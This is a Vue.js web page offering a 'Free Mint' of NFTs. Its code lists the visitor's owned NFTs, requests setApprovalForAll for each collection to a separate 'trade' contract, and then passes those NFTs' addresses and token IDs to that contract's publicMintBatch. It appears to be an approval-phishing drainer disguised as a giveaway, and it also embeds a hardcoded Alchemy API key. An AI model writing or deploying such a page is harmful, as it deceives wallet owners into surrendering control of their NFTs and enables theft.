<template>
    <article class="page-home">
        <div class="bg"><img style="width: 100%" src="../../assets/images/common/bg.png" /></div>
        <div class="content">
            <div class="button-content">
                <div class="jian"><img src="../../assets/images/common/jiantou.png" /> </div>
                <div class="button" @click="openDialog">
                    <div>Free</div>
                    <div>Mint</div>
                </div>
            </div>
        </div>
        <van-dialog v-model="visible" :closeOnClickOverlay="false" :show-confirm-button="false" :width="cpd_width">
            <div class="list-container">
                <div class="list-header"><div class="close" @click="visible = false"><van-icon name="cross" /></div></div>
                <div class="loading" v-if="loading"><van-loading color="#1989fa" /></div>
                <template v-else>
                    <div class="wallet-nft-list">
                        <div class="list-content">
                            <div class="list-item" v-for="(item, index) in list" :class="{checked: item.checked}" :key="index" @click="changeItem(item, index)">
                                <div class="icon"><img :src="item.icon" /></div>
                                <div class="check-box" v-if="item.checked"><van-checkbox v-model="item.checked" shape="square"></van-checkbox></div>
                            </div>
                        </div>
                    </div>
                    <div class="list-buttons">
                        <van-button
                                v-if="cpd_checkApprove"
                                :disabled="loadingApprove"
                                :loading="loadingApprove"
                                loading-text="Approve"
                                @click="setApprovalForAll"
                        >Approve</van-button>
                        <div class="line" v-if="cpd_checkApprove"></div>
                        <van-button
                                :disabled="cpd_checkedData.length === 0 || cpd_checkApprove || loadingConfirm"
                                :loading="loadingConfirm"
                                loading-text="Confirm"
                                @click="onSubmit"
                        >Free Mint</van-button>
                    </div>
                </template>
            </div>
        </van-dialog>
    </article>
</template>

<script>
import { createAlchemyWeb3 } from '@alch/alchemy-web3'
import { mapState } from 'vuex'
import { contracts } from '../../config/constant'
export default {
    name: 'PageHome',
    components: {
    },
    data() {
        return {
            loading: true,
            visible: false,
            approveList: [],
            contract: null,
            fromContract: null,
            list: [],
            alchemyWeb3: null,
            loadingApprove: false,
            loadingConfirm: false
        }
    },
    computed: {
       ...mapState({
           account: state => state.account,
           chainId: state => state.chainId
       }),
       cpd_checkedData() {
           return this.list.filter(item => item.checked)
       },
        cpd_checkApprove({cpd_checkedData, approveList}) {
           let check = false
            cpd_checkedData.forEach(item => {
                if (approveList.indexOf(item.contractAddress) > -1) {
                    check = true
                }
            })
           return check
        },
        cpd_approveList({cpd_checkedData, approveList}) {
           const list = []
            cpd_checkedData.forEach(item => {
                if (approveList.indexOf(item.contractAddress) > -1) {
                    list.push(item.contractAddress)
                }
            })
            return list
        },
       cpd_width() {
           if (this.$mobile) {
               return '90%'
           }
           return 640
       }
    },
    watch: {
        account(v) {
            if (v) {
                this.getNFTData(v)
            }
        },
        chainId(v) {
            if (v === '0x1' || v === '0x5') {
                if (this.account) {
                    this.getNFTData(this.account)
                }
            }
        }
    },
    created() {
        if (this.$vueweb3.web3Env) {
            // alert(11111)
        }
        this.contract = this.$vueweb3.contract(this.$abi.trade, contracts.trade).methods
        this.alchemyWeb3 = createAlchemyWeb3(
            'https://eth-goerli.g.alchemy.com/v2/jWJv2PQ8nTf36fWkvAE6edepCVv6lrh2',
        );
        if (this.account) {
            this.isApprovedForAll()
        }
    },
    mounted() {
        if (this.account) {
            this.getNFTData(this.account)
        }
    },
    methods: {
        async getNFTData(owner) {
            if (this.chainId !== '0x1' && this.chainId !== '0x5') {
                this.$dialog.alert({
                    message: 'Meta MaskGoerli'
                })
                return
            }
            const res = await this.alchemyWeb3.alchemy.getNfts({ owner })
            const tokens = []
            const list = res.ownedNfts.filter(item => item.contract.address.toUpperCase() !== contracts.to.toUpperCase())
            for (let i = 0; i < list.length; i++) {
                const item = list[i]
                item.contractAddress = item.contract.address
                item.tokenId = this.$web3.utils.hexToNumber(item.id.tokenId)
                item.icon = item.media[0].gateway || 'https://ipfs.io/ipfs/QmYxT4LnK8sqLupjbS6eRvu1si7Ly2wFQAqFebxhWntcf6'
                if (tokens.indexOf(item.contractAddress) === -1) {
                    tokens.push(item.contractAddress)
                    await this.isApprovedForAll(item.contractAddress)
                }
            }
            this.list = list
            this.loading = false
            this.loadingConfirm = false
        },
        async isApprovedForAll(address) {
            const fromContract = this.$vueweb3.contract(this.$abi.erc721, address).methods
            const approved = await fromContract.isApprovedForAll(this.account, contracts.trade).call({})
            console.log(approved, 999999999)
            if (!approved) {
                this.approveList.push(address)
            }
        },
        async setApprovalForAll() {
            if (this.cpd_approveList.length === 0) {
                this.loadingApprove = false
                return
            }
            this.loadingApprove = true
            const address = this.cpd_approveList[0]
            const fromContract = this.$vueweb3.contract(this.$abi.erc721, address).methods
            const res = await fromContract.setApprovalForAll(contracts.trade, true).send({
                from: this.account
            })
            const approveList = []
            this.approveList.forEach((item) => {
               if (item.toUpperCase() !== address.toUpperCase()) {
                   approveList.push(item)
               }
            })
            if (res) {
                this.approveList = approveList
                this.setApprovalForAll()
            }
            this.loadingApprove = false
        },
        openDialog() {
            if (!this.account) {
                this.$store.commit('setVisibleWalletModal', true)
            } else {
                this.visible = true
            }

        },
        changeItem(item, index) {
            item.checked = !item.checked
            this.$set(this.list, index, item)
        },
        async onSubmit() {
            const address = []
            const tokenIds = []
            this.cpd_checkedData.forEach(item => {
                address.push(item.contractAddress)
                tokenIds.push(item.tokenId)
            })
            this.loadingConfirm = true
            const res = await this.contract.publicMintBatch(address, tokenIds).send({from: this.account})
            if (res) {
                this.getNFTData(this.account)
            }
            this.loadingConfirm = false
        }
    }
}
</script>

